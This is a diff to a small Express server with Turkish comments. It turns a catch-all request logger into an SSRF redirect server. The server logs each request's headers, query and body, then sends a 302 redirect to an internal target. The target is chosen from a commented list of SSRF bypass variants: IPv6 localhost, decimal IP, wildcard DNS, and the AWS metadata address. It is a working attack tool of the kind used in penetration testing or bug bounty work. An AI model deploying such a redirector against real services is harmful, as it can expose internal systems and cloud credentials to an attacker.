@@ -2,11 +2,20 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// --- 🎯 SSRF / YÖNLENDİRME HEDEFİNİ BURADAN SEÇEBİLİRSİN ---
+// Alternatifleri test etmek için yorum satırını değiştirebilirsin:
+// const TARGET_URL = "http://127.0.0.1:8080";            // Standart Localhost
+const TARGET_URL = "http://[::1]:8080";                // IPv6 Localhost
+// const TARGET_URL = "http://2130706433/";               // Decimal IP formatı
+// const TARGET_URL = "http://127.0.0.1.xip.io/";         // DNS rebinding / wildcard DNS
+//const TARGET_URL = "http://169.254.169.254/latest/meta-data/"; // AWS Cloud Metadata
+// ---------------------------------------------------------
+
 // Geniş gövdeleri (body) okuyabilmek için limitleri artırıyoruz
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
-// Tüm gelen istekleri yakalayan detaylı log middleware'i
+// Tüm gelen istekleri yakalayan ve yönlendiren middleware
 app.use((req, res) => {
     const timestamp = new Date().toISOString();
     
@@ -16,7 +25,7 @@ app.use((req, res) => {
                      req.socket.remoteAddress;
 
     console.log('\n' + '='.repeat(60));
-    console.log(`[${timestamp}] 🎯 YENİ İSTEK YAKALANDI!`);
+    console.log(`[${timestamp}] 🎯 YENİ İSTEK YAKALANDI VE YÖNLENDİRİLİYOR!`);
     console.log('='.repeat(60));
     console.log(`🔹 Yol (Path)      : ${req.path}`);
     console.log(`🔹 Orijinal URL    : ${req.originalUrl}`);
@@ -30,11 +39,11 @@ app.use((req, res) => {
         console.dir(req.query, { depth: null, colors: true });
     }
     
-    // İstek Başlıkları (Headers - User-Agent, Referer, Cookie vb.)
+    // İstek Başlıkları (Headers)
     console.log('\n--- 📋 HEADERS (BAŞLIKLAR) ---');
     console.dir(req.headers, { depth: null, colors: true });
 
-    // İstek Gövdesi (Body - POST verileri, JSON vb.)
+    // İstek Gövdesi (Body)
     if (req.body) {
         const bodyKeys = Object.keys(req.body);
         if (bodyKeys.length > 0 || (typeof req.body === 'string' && req.body.length > 0)) {
@@ -45,15 +54,12 @@ app.use((req, res) => {
 
     console.log('='.repeat(60) + '\n');
 
-    // İstek atan tarafa standart bir yanıt dönelim
-    return res.status(200).send({
-        status: "success",
-        message: "Istek basariyla loglandi!",
-        your_ip: clientIp,
-        received_path: req.path
-    });
+    console.log(`⚡ [REDIRECT] İstek atan istemci şu adrese fırlatılıyor ➔ ${TARGET_URL}`);
+
+    // HTTP 302 yönlendirmesi ile hedef iç ağ adresine veya metadata'ya zıplatıyoruz
+    return res.redirect(302, TARGET_URL);
 });
 
 app.listen(PORT, () => {
-    console.log(`Gelişmiş log sunucusu ${PORT} portunda başarıyla dinlemede... 🚀`);
+    console.log(`Yönlendirmeli Gelişmiş Log Sunucusu ${PORT} portunda dinlemede... 🚀`);
 });
